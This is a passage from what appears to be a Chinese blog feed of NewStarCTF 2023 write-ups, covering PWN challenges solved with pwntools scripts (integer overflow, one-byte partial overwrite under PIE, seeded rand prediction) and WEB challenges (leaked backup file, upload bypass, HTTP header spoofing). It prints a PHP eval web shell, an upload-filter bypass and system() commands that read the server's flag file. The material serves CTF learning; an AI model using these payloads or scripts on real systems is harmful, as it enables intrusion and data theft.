<code>flag&#123;c67dd0d3-522f-49fd-8f7e-b073f471cd9c&#125;</code></p>\n<h3 id=\"newstar-shop\"><a class=\"markdownIt-Anchor\" href=\"#newstar-shop\">#</a> newstar shop</h3>\n<p><strong>考点：整数溢出</strong></p>\n<p>查看文件的安全保护，发现全开了，不过没关系，本题考查的是整数溢出。</p>\n<p>![image-20231007160826985](NewStarCTF 2023 公开赛道 PWN/image-20231007160826985.png)</p>\n<p>查看源码可以发现，在商店中购买物品会扣除钱，money 初始化为 64h，即 100 元，shop 中一共可以划掉 60：</p>\n<p>![image-20231007161011266](NewStarCTF 2023 公开赛道 PWN/image-20231007161011266.png)</p>\n<p>剩下的一个需要去 dont_try 中去花掉，点击会 - 50。在商店中购买时会检查你的钱够不够，不够是没办法购买的，所以最后使钱小于 0 这一步只能在第三个 dont_try 中花掉。</p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28951</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#花掉 40</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#花掉 20</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#花掉 50</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 购买 shell</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>获取 flag 如下：</p>\n<p>![image-20231007162007829](NewStarCTF 2023 公开赛道 PWN/image-20231007162007829.png)</p>\n<p><code>flag&#123;cf39380f-910a-4125-a91b-21bf1b9f3eec&#125;</code></p>\n<h3 id=\"p1eee\"><a class=\"markdownIt-Anchor\" href=\"#p1eee\">#</a> p1eee</h3>\n<p><strong>考点：pie，partial overwrite</strong></p>\n<p>进入题目，打开 IDA ，找到后门函数：</p>\n<p>![image-20231007211944489](NewStarCTF 2023 公开赛道 PWN/image-20231007211944489.png)</p>\n<p>![image-20231007212111886](NewStarCTF 2023 公开赛道 PWN/image-20231007212111886.png)</p>\n<p>我们可以发现，溢出位置应该发生在 120E 函数中：</p>\n<p>![image-20231007212314466](NewStarCTF 2023 公开赛道 PWN/image-20231007212314466.png)</p>\n<p>我们再看 main 函数，可以发现其调用了 120E 函数，并且，最后 120E 函数的返回地址应该是 1297：</p>\n<p>![image-20231007213111787](NewStarCTF 2023 公开赛道 PWN/image-20231007213111787.png)</p>\n<p>和我们的后门函数的起始地址 1264 只差了 最后两个 16 进制数，也就是 1 字节的差距。虽然由于开了 PIE，基地址是不确定的，但是由于基地址最低 3 个 16 进制位为 0，所以低 3 位的偏移还是可以确定的。再看我们的 120E 函数，可以看到，buf 的空间范围是 0~-20，就是 20 个字节，再加上需要覆盖掉 ebp 的 8 字节，一共 28 字节，但是 read 读入了 29 字节，所以刚好多出一个字节供我们使用。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29292</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x28</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x6c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231008135313847](NewStarCTF 2023 公开赛道 PWN/image-20231008135313847.png)</p>\n<p>得到 flag： <code>flag&#123;c9278352-5086-413f-99a8-034a7e2a1300&#125;</code></p>\n<h3 id=\"random\"><a class=\"markdownIt-Anchor\" href=\"#random\">#</a> Random</h3>\n<p><strong>考点</strong>：<strong>ctypes，pwntools</strong></p>\n<p>打开题目查看安全信息：全开了…</p>\n<p>![image-20231008135534154](NewStarCTF 2023 公开赛道 PWN/image-20231008135534154.png)</p>\n<p>这一题看大佬的说法是：利用 ctypes 库在 python 代码中调用 c 语言函数，可以与程序生成同样的伪随机数。</p>\n<pre><code>由于远程那边启动和本地加载libc有一定时间差，我在远程连接后本地获取的time0返回值减了1，然后就rand（）获取随机数发送就行了。\n\n只能说还是有一定运气成分的，有时候不一定能随机到$0，我是大概试个两三次就可以了。\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dll <span class=\"token operator\">=</span> CDLL<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#io = process('./random')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29115</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>seed <span class=\"token operator\">=</span> dll<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dll<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'number?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>dll<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231008142330615](NewStarCTF 2023 公开赛道 PWN/image-20231008142330615.png)</p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/",
            "url": "http://yanagi-kon.github.io/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/",
            "title": "NewStarCTF 2023 公开赛道 WEB题目",
            "date_published": "2023-10-04T09:06:00.000Z",
            "content_html": "<h2 id=\"newstarctf-2023-公开赛道-web\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-web\">#</a> NewStarCTF 2023 公开赛道 WEB</h2>\n<h3 id=\"泄漏的秘密\"><a class=\"markdownIt-Anchor\" href=\"#泄漏的秘密\">#</a> 泄漏的秘密</h3>\n<p><strong>考点：敏感文件泄漏</strong></p>\n<p>通过盲猜 www.zip、index.php 等常用隐藏名称可以猜出。或者使用 dirsearch 进行搜索，可以查找到 www.zip 文件：</p>\n<p><img data-src=\"image-20231003102650464.png\" alt=\"image-20231003102650464\"></p>\n<p>进行访问下载解压即可获得两个文件，将两个文件中的字段拼接起来就是 flag： <code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p>\n<p><img data-src=\"image-20231003102104114.png\" alt=\"image-20231003102104114\"></p>\n<h3 id=\"begin-of-upload\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-upload\">#</a> Begin of Upload</h3>\n<p><strong>考点：php 文件上传漏洞</strong>，<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjk1Nw==\">一句话木马介绍</span></p>\n<p>编写含有一句话木马的文件命名为 1.php，内容为：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"it is ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>点击上传后会提示：</p>\n<p><img data-src=\"image-20231003103302992.png\" alt=\"image-20231003103302992\"></p>\n<p>改传 1.php.png，随后通过 Burp 拦截将上传内容修改为 1.php，上传成功：</p>\n<p><img data-src=\"image-20231003110326234.png\" alt=\"image-20231003110326234\"></p>\n<p>再利用 中国蚁剑 工具进行链接：</p>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>http<span class=\"token operator\">:</span><span class=\"token comment\">//eade7cdc-4610-4431-8fad-84e6f86ba897.node4.buuoj.cn:81/upload/1.php</span></pre></td></tr></table></figure><p><img data-src=\"image-20231003110436400.png\" alt=\"image-20231003110436400\"></p>\n<p>直接在蚁剑中找到 flag 文件 fllll4g：</p>\n<p><img data-src=\"image-20231003112917654.png\" alt=\"image-20231003112917654\"></p>\n<p>或者 使用 Hackbar，查看目录内容也可以得知含有 fllll4g 文件：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'ls /'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image-20231003113042254.png\" alt=\"image-20231003113042254\"></p>\n<p>再利用以下代码，得到 flag</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'cat /fllll4g'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"begin-of-http\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-http\">#</a> Begin of HTTP</h3>\n<p><strong>考点：HTTP 常见请求头、HTTP 请求方式</strong></p>\n<p>进入题目后，首先要求以 GET 方式给 ctf 参数传参数：</p>\n<p><img data-src=\"image-20231004093250416.png\" alt=\"image-20231004093250416\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//node4.buuoj.cn:29762/?ctf=1</span></span></pre></td></tr></table></figure><p>之后要求用 POST 方法传入 secret 参数，并且必须是正确的 secret：</p>\n<p><img data-src=\"image-20231004094638065.png\" alt=\"image-20231004094638065\"></p>\n<p>打开网页源代码可以找到 secret 提示：</p>\n<p><img data-src=\"image-20231004094715815.png\" alt=\"image-20231004094715815\"></p>\n<p>Base64 解码后得到 secret 参数：</p>\n<pre><code>n3wst4rCTF2023g00000d\n</code></pre>\n<p>利用 Hackbar 传入 POST 参数：</p>\n<p><img data-src=\"image-20231004094931704.png\" alt=\"image-20231004094931704\"></p>\n<p>下面更改 power 参数为 ctfer：</p>\n<p><img data-src=\"image-20231004095011586.png\" alt=\"image-20231004095011586\"></p>\n<p>再更改浏览器参数为 NewStarCTF2023：</p>\n<p><img data-src=\"image-20231004095107075.png\" alt=\"image-20231004095107075\"></p>\n<p>之后加入 Refer 参数，并修改为 <span class=\"exturl\" data-url=\"aHR0cDovL25ld3N0YXJjdGYuY29t\">newstarctf.com</span>：</p>\n<p><img data-src=\"image-20231004095225805.png\" alt=\"image-20231004095225805\"></p>\n<p>加入 X-Real-IP 参数为 127.0.0.1，修改为本地用户访问：</p>\n<p><img data-src=\"image-20231004095445708.png\" alt=\"image-20231004095445708\"></p>\n<p>得到最终的 flag 值： <code>flag&#123;46df0dd3-dd02-4402-9e1e-08e555917442&#125;</code></p>\n<p><strong>另：</strong></p>\n<p>本题还可以使用 Burp 等工具进行修改参数，还可以使用 Python 进行求解：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> requests <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> base64 <span class=\"token keyword\">import</span> b64decode</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://node4.buuoj.cn:29762/'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>params <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">'ctf'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">'secret'</span><span class=\"token punctuation\">:</span> b64decode<span class=\"token punctuation\">(</span><span class=\"token string\">'bjN3c3Q0ckNURjIwMjNnMDAwMDBk'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cookies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">'power'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'ctfer'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'NewStarCTF2023'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token string\">'Referer'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'newstarctf.com'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'X-Real-IP'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'localhost'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s <span class=\"token operator\">=</span> Session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>r <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> params<span class=\"token operator\">=</span>params<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>cookies<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get_dict<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>输出为：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Begin of HTTP<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/style.css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/style.css<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token selector\">body</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #16a085<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span> hidden<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token selector\">canvas</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> -1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/jquery.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/verificationNumbers.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/verificationNumbers.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/Particleground.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/Particleground.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">$</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">ready</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">particleground</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token literal-property property\">dotColor</span><span class=\"token operator\">:</span> <span class=\"token string\">'#5cbdaa'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token literal-property property\">lineColor</span><span class=\"token operator\">:</span> <span class=\"token string\">'#5cbdaa'</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>ß</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dl</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token 